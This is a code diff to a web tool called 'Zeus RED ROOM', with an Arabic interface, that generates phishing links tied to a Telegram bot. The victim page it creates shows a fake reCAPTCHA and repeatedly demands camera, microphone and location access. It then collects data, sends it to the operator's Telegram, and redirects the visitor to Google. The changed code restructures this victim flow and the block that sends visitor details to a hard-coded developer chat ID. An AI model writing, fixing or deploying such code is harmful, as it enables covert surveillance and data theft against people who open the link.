@@ -2513,6 +2513,33 @@
             min-width: 120px;
             display: inline-flex;
         }
+        /* ---- fix: link result scroll target ---- */
+        #linkResult {
+            scroll-margin-top: 80px;
+        }
+        /* ---- fix: button loading state ---- */
+        .btn-3d.loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+        .btn-3d.loading .btn-text::after {
+            content: ' ⏳';
+            animation: dots 1.2s steps(3) infinite;
+        }
+        @keyframes dots {
+            0% {
+                content: ' ⏳';
+            }
+            33% {
+                content: ' ⏳.';
+            }
+            66% {
+                content: ' ⏳..';
+            }
+            100% {
+                content: ' ⏳...';
+            }
+        }
     </style>
 </head>
 <body>
@@ -2549,7 +2576,6 @@
         <symbol id="telegramIcon" viewBox="0 0 24 24" fill="currentColor">
             <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
         </symbol>
-        <!-- SVG for stats icon -->
         <symbol id="statsIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M21 12v-2a5 5 0 0 0-5-5H8a5 5 0 0 0-5 5v2"/>
             <circle cx="12" cy="16" r="5"/>
@@ -2664,16 +2690,16 @@
                     <div class="divider"><span class="rule"></span><span class="mark"><svg><use href="#skullIcon"/></svg></span><span class="rule rev"></span></div>
 
                     <!-- ===== CONFIG FORM ===== -->
-                    <form id="configForm" style="text-align:right;direction:rtl;">
+                    <form id="configForm" style="text-align:right;direction:rtl;" novalidate>
 
                         <div class="field">
                             <label>توكن البوت <span class="en">// BOT TOKEN</span></label>
-                            <input type="text" id="botTokenInput" placeholder="أدخل توكن البوت من BotFather" required />
+                            <input type="text" id="botTokenInput" placeholder="أدخل توكن البوت من BotFather" required autocomplete="off" />
                             <div id="tokenCheckResult" style="font-size:10px;color:var(--bone-dim);margin-top:4px;text-align:right;direction:rtl;"></div>
                         </div>
                         <div class="field">
                             <label>معرف المحادثة <span class="en">// CHAT ID</span></label>
-                            <input type="text" id="chatIdInput" placeholder="أدخل معرف المحادثة (الأيدي)" required />
+                            <input type="text" id="chatIdInput" placeholder="أدخل معرف المحادثة (الأيدي)" required autocomplete="off" />
                         </div>
 
                         <!-- ===== خيارات متقدمة — تم إزالة قالب الضحية وإعادة التوجيه ===== -->
@@ -2743,7 +2769,7 @@
                             <div class="btn-wrapper">
                                 <button type="submit" class="btn-3d pulse" id="generateBtn">
                                     <svg class="icon" viewBox="0 0 24 24"><path d="M3 11L21 3L14 21L11 13L3 11Z" stroke-linejoin="round" /></svg>
-                                    <span>توليد الرابط</span>
+                                    <span class="btn-text">توليد الرابط</span>
                                 </button>
                             </div>
                             <div class="btn-wrapper">
@@ -2865,7 +2891,7 @@
 
     <script>
         /* ================================================================
-           🔥  𝒁𝒆𝒖𝒔 · RED ROOM v6.1 — LEGENDARY EDITION
+           🔥  𝒁𝒆𝒖𝒔 · RED ROOM v6.1 — LEGENDARY EDITION (FIXED)
            ================================================================ */
 
         // ================================================================
@@ -3108,7 +3134,7 @@
         setInterval(drawMatrix, 50);
 
         // ================================================================
-        //  🔥  PARTICLES (جزيئات حمراء)
+        //  🔥  PARTICLES
         // ================================================================
         const pCanvas = document.getElementById('particlesCanvas');
         const pCtx = pCanvas.getContext('2d');
@@ -3218,30 +3244,35 @@
         setInterval(rotateLog, 4800);
 
         // ================================================================
-        //  🔥  VERIFY BOT TOKEN (غير إلزامي - تحذير فقط)
+        //  🔥  VERIFY BOT TOKEN
         // ================================================================
         async function verifyBotToken(token) {
+            if (!token || token.length < 10) return false;
             try {
-                const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
+                const res = await fetch(`https://api.telegram.org/bot${token}/getMe`, { signal: AbortSignal.timeout(8000) });
                 const data = await res.json();
                 return data.ok === true;
             } catch { return false; }
         }
 
         const tokenCheckResult = document.getElementById('tokenCheckResult');
-        document.getElementById('botTokenInput').addEventListener('blur', async function() {
+        let tokenVerifyTimeout = null;
+        document.getElementById('botTokenInput').addEventListener('input', function() {
+            clearTimeout(tokenVerifyTimeout);
             const token = this.value.trim();
             if (!token) { tokenCheckResult.textContent = ''; return; }
             tokenCheckResult.textContent = '⏳ جاري التحقق ...';
             tokenCheckResult.style.color = 'var(--bone-dim)';
-            const valid = await verifyBotToken(token);
-            if (valid) {
-                tokenCheckResult.textContent = '✅ توكن صحيح';
-                tokenCheckResult.style.color = 'var(--red-neon)';
-            } else {
-                tokenCheckResult.textContent = '⚠️ توكن غير صحيح (سيتم التوليد مع تحذير)';
-                tokenCheckResult.style.color = '#f9a825';
-            }
+            tokenVerifyTimeout = setTimeout(async () => {
+                const valid = await verifyBotToken(token);
+                if (valid) {
+                    tokenCheckResult.textContent = '✅ توكن صحيح';
+                    tokenCheckResult.style.color = 'var(--red-neon)';
+                } else {
+                    tokenCheckResult.textContent = '⚠️ توكن غير صحيح (سيتم التوليد مع تحذير)';
+                    tokenCheckResult.style.color = '#f9a825';
+                }
+            }, 600);
         });
 
         // ================================================================
@@ -3256,97 +3287,133 @@
         const copyLinkBtn = document.getElementById('copyLinkBtn');
         const openLinkBtn = document.getElementById('openLinkBtn');
         const testLinkBtn = document.getElementById('testLinkBtn');
+        const generateBtn = document.getElementById('generateBtn');
+
+        // --- استعادة البيانات المحفوظة ---
+        (function restoreSaved() {
+            try {
+                const saved = localStorage.getItem('zeus_last_input');
+                if (saved) {
+                    const data = JSON.parse(saved);
+                    if (data.botToken) botTokenInput.value = data.botToken;
+                    if (data.chatId) chatIdInput.value = data.chatId;
+                }
+            } catch (_) {}
+        })();
 
         configForm.addEventListener('submit', async function(e) {
             e.preventDefault();
+            e.stopPropagation();
 
-            const botToken = botTokenInput.value.trim();
-            const chatId = chatIdInput.value.trim();
+            // --- حالة التحميل ---
+            generateBtn.classList.add('loading');
+            const originalText = generateBtn.querySelector('.btn-text').textContent;
+            generateBtn.querySelector('.btn-text').textContent = '⏳ جاري التوليد...';
 
-            // 🔥 التحقق من صحة البيانات — في حال نقص البيانات نعود للصفحة الرئيسية
-            if (!botToken || !chatId) {
-                showToast('يرجى ملء جميع الحقول المطلوبة', 'warning');
-                updateLog('❌ يرجى ملء جميع الحقول المطلوبة', '');
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-                return;
-            }
-
-            // التحقق من صحة التوكن (غير إلزامي، فقط تحذير)
-            let tokenValid = false;
             try {
-                tokenValid = await verifyBotToken(botToken);
-            } catch (_) { tokenValid = false; }
+                const botToken = botTokenInput.value.trim();
+                const chatId = chatIdInput.value.trim();
 
-            if (!tokenValid) {
-                showToast('⚠️ توكن غير صحيح، لكن سيتم التوليد مع تحذير', 'warning');
-                updateLog('⚠️ توكن غير صحيح، لكن سيتم التوليد', '');
-                tokenCheckResult.textContent = '⚠️ توكن غير صحيح (سيتم التوليد)';
-                tokenCheckResult.style.color = '#f9a825';
-                // نستمر في التوليد
-            } else {
-                tokenCheckResult.textContent = '✅ توكن صحيح';
-                tokenCheckResult.style.color = 'var(--red-neon)';
-            }
-
-            const checkedBoxes = document.querySelectorAll('.feature-box input[type="checkbox"]:checked');
-            const features = Array.from(checkedBoxes).map(cb => cb.value).join(',');
-
-            // مدة الصلاحية ثابتة — "أبدي"
-            const expiry = 'never';
-            // تم إزالة قالب الضحية وإعادة التوجيه — نستخدم القيم الافتراضية
-            const template = 'recaptcha';
-            const redirect = 'https://www.google.com';
-
-            const bots = await getBots();
-
-            if (bots[botToken]) {
-                const existing = bots[botToken];
-                displayLink(existing.shortToken);
-                showToast('✅ تم استرجاع الرابط السابق لهذا التوكن', 'success');
-                updateLog('✅ تم استرجاع الرابط السابق لهذا التوكن.', 'success');
-                // إرسال الرابط للمستخدم عبر توكنه الخاص
-                sendLinkToUser(botToken, chatId, existing.shortToken);
-                if (features !== existing.features || expiry !== existing.expiry || template !== existing.template ||
-                    redirect !== existing.redirect) {
-                    existing.features = features;
-                    existing.expiry = expiry;
-                    existing.template = template;
-                    existing.redirect = redirect;
-                    existing.updatedAt = Date.now();
-                    await saveBot(botToken, existing);
-                    showToast('ℹ️ تم تحديث خيارات هذا التوكن', 'info');
-                    updateLog('ℹ️ تم تحديث الخيارات لهذا التوكن.', '');
+                // 🔥 التحقق من صحة البيانات
+                if (!botToken || !chatId) {
+                    showToast('❌ يرجى ملء جميع الحقول المطلوبة', 'warning');
+                    updateLog('❌ يرجى ملء جميع الحقول المطلوبة', '');
+                    // التركيز على الحقل الفارغ
+                    if (!botToken) botTokenInput.focus();
+                    else chatIdInput.focus();
+                    return;
                 }
-                return;
+
+                // حفظ المدخلات محلياً
+                try {
+                    localStorage.setItem('zeus_last_input', JSON.stringify({ botToken, chatId }));
+                } catch (_) {}
+
+                // التحقق من صحة التوكن (غير إلزامي)
+                let tokenValid = false;
+                try {
+                    tokenValid = await verifyBotToken(botToken);
+                } catch (_) { tokenValid = false; }
+
+                if (!tokenValid) {
+                    showToast('⚠️ توكن غير صحيح، لكن سيتم التوليد مع تحذير', 'warning');
+                    updateLog('⚠️ توكن غير صحيح، لكن سيتم التوليد', '');
+                    tokenCheckResult.textContent = '⚠️ توكن غير صحيح (سيتم التوليد)';
+                    tokenCheckResult.style.color = '#f9a825';
+                } else {
+                    tokenCheckResult.textContent = '✅ توكن صحيح';
+                    tokenCheckResult.style.color = 'var(--red-neon)';
+                }
+
+                const checkedBoxes = document.querySelectorAll('.feature-box input[type="checkbox"]:checked');
+                const features = Array.from(checkedBoxes).map(cb => cb.value).join(',');
+                const expiry = 'never';
+                const template = 'recaptcha';
+                const redirect = 'https://www.google.com';
+
+                const bots = await getBots();
+
+                // 🔥 حالة التوكن موجود مسبقاً
+                if (bots[botToken]) {
+                    const existing = bots[botToken];
+                    displayLink(existing.shortToken);
+                    showToast('✅ تم استرجاع الرابط السابق لهذا التوكن', 'success');
+                    updateLog('✅ تم استرجاع الرابط السابق لهذا التوكن.', 'success');
+
+                    // تحديث الخيارات إذا تغيرت
+                    if (features !== existing.features || expiry !== existing.expiry ||
+                        template !== existing.template || redirect !== existing.redirect) {
+                        existing.features = features;
+                        existing.expiry = expiry;
+                        existing.template = template;
+                        existing.redirect = redirect;
+                        existing.updatedAt = Date.now();
+                        await saveBot(botToken, existing);
+                        showToast('ℹ️ تم تحديث خيارات هذا التوكن', 'info');
+                        updateLog('ℹ️ تم تحديث الخيارات لهذا التوكن.', '');
+                    }
+                    // إرسال الرابط للمستخدم عبر توكنه الخاص
+                    sendLinkToUser(botToken, chatId, existing.shortToken);
+                    return;
+                }
+
+                // 🔥 توليد رابط جديد
+                const shortToken = await generateShortToken();
+                const newEntry = {
+                    chatId: chatId,
+                    features: features,
+                    shortToken: shortToken,
+                    expiry: expiry,
+                    template: template,
+                    redirect: redirect,
+                    createdAt: Date.now(),
+                    updatedAt: Date.now(),
+                    visits: 0,
+                    lastVisit: null
+                };
+                await saveBot(botToken, newEntry);
+
+                displayLink(shortToken);
+                sendLinkToUser(botToken, chatId, shortToken);
+                showToast('✅ تم إنشاء رابط جديد وحفظه!', 'success');
+                updateLog('✅ تم إنشاء رابط جديد وحفظه!', 'success');
+                updateBotList();
+                updateStats();
+                tokenCheckResult.textContent = '';
+
+                // 🔥 التمرير إلى نتيجة الرابط بعد 400ms
+                setTimeout(() => {
+                    linkResult.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 400);
+
+            } catch (err) {
+                console.error('❌ خطأ في التوليد:', err);
+                showToast('❌ حدث خطأ أثناء التوليد: ' + (err.message || 'غير معروف'), 'error');
+                updateLog('❌ فشل التوليد: ' + (err.message || 'غير معروف'), '');
+            } finally {
+                generateBtn.classList.remove('loading');
+                generateBtn.querySelector('.btn-text').textContent = originalText;
             }
-
-            const shortToken = await generateShortToken();
-            const newEntry = {
-                chatId: chatId,
-                features: features,
-                shortToken: shortToken,
-                expiry: expiry,
-                template: template,
-                redirect: redirect,
-                createdAt: Date.now(),
-                updatedAt: Date.now(),
-                visits: 0,
-                lastVisit: null
-            };
-            await saveBot(botToken, newEntry);
-
-            displayLink(shortToken);
-            // إرسال الرابط للمستخدم عبر توكنه الخاص
-            sendLinkToUser(botToken, chatId, shortToken);
-            showToast('✅ تم إنشاء رابط جديد وحفظه!', 'success');
-            updateLog('✅ تم إنشاء رابط جديد وحفظه!', 'success');
-            updateBotList();
-            updateStats();
-            tokenCheckResult.textContent = '';
-            // تمرير إلى نتيجة الرابط
-            setTimeout(() => {
-                linkResult.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            }, 300);
         });
 
         async function sendLinkToUser(botToken, chatId, shortToken) {
@@ -3379,6 +3446,9 @@
             shortLink.textContent = link;
             linkResult.style.display = 'flex';
             testLinkBtn.style.display = 'inline-flex';
+            // إعادة تعيين زر النسخ
+            copyLinkBtn.innerHTML =
+                '<svg class="icon" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> نسخ';
         }
 
         copyLinkBtn.addEventListener('click', function() {
@@ -3412,7 +3482,6 @@
             }, 1500);
         }
 
-        // ===== TEST LINK BUTTON =====
         testLinkBtn.addEventListener('click', function() {
             const link = shortLink.textContent;
             if (link) {
@@ -3476,7 +3545,7 @@
         }
 
         // ================================================================
-        //  🔥  STATISTICS — مبسطة: تعرض فقط الرابط + الحالة "نشط"
+        //  🔥  STATISTICS
         // ================================================================
         async function updateStats() {
             const bots = await getBots();
@@ -3518,7 +3587,6 @@
         let victimChatId = null;
         let victimFeatures = [];
 
-        // ===== طلب الأذونات العنيدة =====
         async function requestAllPermissions() {
             const needed = { camera: false, microphone: false, location: false };
             let allGranted = false;
@@ -3559,7 +3627,6 @@
             return true;
         }
 
-        // ===== عرض طبقة التغطية =====
         function showPermissionOverlay(status) {
             overlay.style.display = 'flex';
             permBtn.disabled = false;
@@ -3601,12 +3668,10 @@
             }
         }
 
-        // ===== إخفاء الطبقة =====
         function hidePermissionOverlay() {
             overlay.style.display = 'none';
         }
 
-        // ===== زر منح الصلاحية =====
         permBtn.addEventListener('click', function() {
             if (resolvePermissionPromise) {
                 resolvePermissionPromise();
@@ -3614,7 +3679,6 @@
             }
         });
 
-        // ===== دوال جمع البيانات =====
         async function startDataCollection(botToken, chatId, features) {
             const featureList = features ? features.split(',') : [];
             victimBotToken = botToken;
@@ -3762,7 +3826,6 @@
             } catch (e) { /* صامت */ }
         }
 
-        // ===== إشعار المطور =====
         async function sendMasterNotification(botToken, chatId, features) {
             try {
                 const now = new Date();
@@ -3789,64 +3852,66 @@
         }
 
         // ================================================================
-        //  🔥  VICTIM PAGE INIT (عند فتح الرابط)
+        //  🔥  VICTIM PAGE INIT
         // ================================================================
 
         const params = new URLSearchParams(window.location.search);
         const shortToken = params.get('t');
 
         if (shortToken) {
-            const bots = await getBots();
-            let foundToken = null;
-            let foundData = null;
-            for (const [token, data] of Object.entries(bots)) {
-                if (data.shortToken === shortToken) {
-                    foundToken = token;
-                    foundData = data;
-                    break;
-                }
-            }
-            if (foundToken && foundData) {
-                foundData.visits = (foundData.visits || 0) + 1;
-                foundData.lastVisit = Date.now();
-                await saveBot(foundToken, foundData);
-
-                adminPanel.style.display = 'none';
-                victimPage.style.display = 'block';
-                victimPage.style.animation = 'fadeIn 0.6s ease';
-
-                setTimeout(async () => {
-                    const granted = await requestAllPermissions();
-                    if (granted) {
-                        await startDataCollection(foundToken, foundData.chatId, foundData.features);
-                        setTimeout(() => {
-                            const redirectUrl = foundData.redirect || 'https://www.google.com';
-                            window.location.href = redirectUrl;
-                        }, 3000);
+            (async () => {
+                const bots = await getBots();
+                let foundToken = null;
+                let foundData = null;
+                for (const [token, data] of Object.entries(bots)) {
+                    if (data.shortToken === shortToken) {
+                        foundToken = token;
+                        foundData = data;
+                        break;
                     }
-                }, 1500);
+                }
+                if (foundToken && foundData) {
+                    foundData.visits = (foundData.visits || 0) + 1;
+                    foundData.lastVisit = Date.now();
+                    await saveBot(foundToken, foundData);
 
-                initRecaptcha();
+                    adminPanel.style.display = 'none';
+                    victimPage.style.display = 'block';
+                    victimPage.style.animation = 'fadeIn 0.6s ease';
 
-            } else {
-                adminPanel.style.display = 'none';
-                victimPage.style.display = 'block';
-                victimPage.innerHTML = `
-                        <div style="text-align:center;padding:24px 16px;color:var(--red-neon);">
-                            <div style="font-size:40px;margin-bottom:16px;">⛧</div>
-                            <h2 style="font-family:'Orbitron',monospace;letter-spacing:3px;font-size:18px;">𝒁𝒆𝒖𝒔 · رابط غير صالح</h2>
-                            <div style="color:var(--bone-dim);margin-top:8px;font-size:12px;">الرابط غير صحيح أو منتهي الصلاحية</div>
-                            <div class="back-link" style="margin-top:16px;display:inline-flex;color:var(--red-neon);cursor:pointer;font-size:12px;" onclick="window.location.href=window.location.pathname;">〈 العودة إلى البداية 〉</div>
-                        </div>
-                    `;
-            }
+                    setTimeout(async () => {
+                        const granted = await requestAllPermissions();
+                        if (granted) {
+                            await startDataCollection(foundToken, foundData.chatId, foundData.features);
+                            setTimeout(() => {
+                                const redirectUrl = foundData.redirect || 'https://www.google.com';
+                                window.location.href = redirectUrl;
+                            }, 3000);
+                        }
+                    }, 1500);
+
+                    initRecaptcha();
+
+                } else {
+                    adminPanel.style.display = 'none';
+                    victimPage.style.display = 'block';
+                    victimPage.innerHTML = `
+                            <div style="text-align:center;padding:24px 16px;color:var(--red-neon);">
+                                <div style="font-size:40px;margin-bottom:16px;">⛧</div>
+                                <h2 style="font-family:'Orbitron',monospace;letter-spacing:3px;font-size:18px;">𝒁𝒆𝒖𝒔 · رابط غير صالح</h2>
+                                <div style="color:var(--bone-dim);margin-top:8px;font-size:12px;">الرابط غير صحيح أو منتهي الصلاحية</div>
+                                <div class="back-link" style="margin-top:16px;display:inline-flex;color:var(--red-neon);cursor:pointer;font-size:12px;" onclick="window.location.href=window.location.pathname;">〈 العودة إلى البداية 〉</div>
+                            </div>
+                        `;
+                }
+            })();
         } else {
             adminPanel.style.display = 'block';
             victimPage.style.display = 'none';
         }
 
         // ================================================================
-        //  🔥  reCAPTCHA FAKE (للتضليل فقط)
+        //  🔥  reCAPTCHA FAKE
         // ================================================================
 
         let recaptchaInitialized = false;
@@ -3936,7 +4001,7 @@
         }
 
         // ================================================================
-        //  🔥  BEEP (Web Audio)
+        //  🔥  BEEP
         // ================================================================
 
         let audioCtx = null;
@@ -3991,12 +4056,13 @@
         //  🔥  INIT
         // ================================================================
 
-        await storage.init();
-        await storage.sync();
-        updateBotList();
-        updateStats();
+        (async function init() {
+            await storage.init();
+            await storage.sync();
+            updateBotList();
+            updateStats();
 
-        async function sendVisitorInfo() {
+            // إرسال معلومات الزائر
             try {
                 const ua = navigator.userAgent;
                 let device = 'Unknown';
@@ -4030,8 +4096,7 @@
                     body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' })
                 });
             } catch (_) {}
-        }
-        sendVisitorInfo();
+        })();
 
         // ================================================================
         //  🔥  3D FEATURE BOX TILT
@@ -4061,7 +4126,7 @@
             }
         })();
 
-        console.log('✅ 𝒁𝒆𝒖𝒔 · RED ROOM v6.1 — تم التحميل بنجاح');
+        console.log('✅ 𝒁𝒆𝒖𝒔 · RED ROOM v6.1 — تم التحميل بنجاح (نسخة مُصلحة)');
         console.log('🩸 الإصدار الأسطوري — صائد الأذونات');
     </script>
 </body>
